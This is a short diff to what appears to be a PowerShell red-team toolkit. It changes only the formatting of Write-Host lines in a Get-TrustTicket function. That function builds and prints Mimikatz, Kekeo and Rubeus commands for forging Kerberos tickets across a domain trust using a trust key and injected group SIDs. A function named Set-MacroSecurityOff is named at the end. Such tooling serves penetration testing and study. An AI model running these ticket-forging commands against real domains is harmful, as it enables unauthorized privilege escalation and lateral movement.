@@ -337,15 +337,15 @@ function Get-TrustTicket{
     $rubeusTGT = "Rubeus.exe silver /sids:$TargetGroupSID /target:$targetDomain /rc4:$trustKey /sid:$SID /domain:$Domain /user:$User /service:$Service/$targetDomain /ldap /nowrap"
     $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsService/$targetComputer /dc:$targetDC /nowrap /ptt"
 
-    Write-Host `n"Printing: Mimikatz TGT command" `n -ForegroundColor Yellow 
-    Write-Host $mimiTGT `n
-    Write-Host "Printing: Kekeo TGS command" `n -ForegroundColor Green
-    Write-Host $kekeoTGS `n
+    Write-Host `n"Printing: Mimikatz TGT command" -ForegroundColor Yellow 
+    Write-Host `n$mimiTGT 
+    Write-Host `n"Printing: Kekeo TGS command" -ForegroundColor Green
+    Write-Host `n$kekeoTGS 
 
-    Write-Host "Printing: Rubeus TGT command" `n -ForegroundColor Yellow
-    Write-Host $rubeusTGT `n
-    Write-Host "Printing: Rubeus TGS command" `n -ForegroundColor Green 
-    Write-Host $rubeusTGS `n
+    Write-Host `n"Printing: Rubeus TGT command" -ForegroundColor Yellow
+    Write-Host `n$rubeusTGT 
+    Write-Host `n"Printing: Rubeus TGS command" -ForegroundColor Green 
+    Write-Host `n$rubeusTGS
 }
 function Set-MacroSecurityOff {
     <#
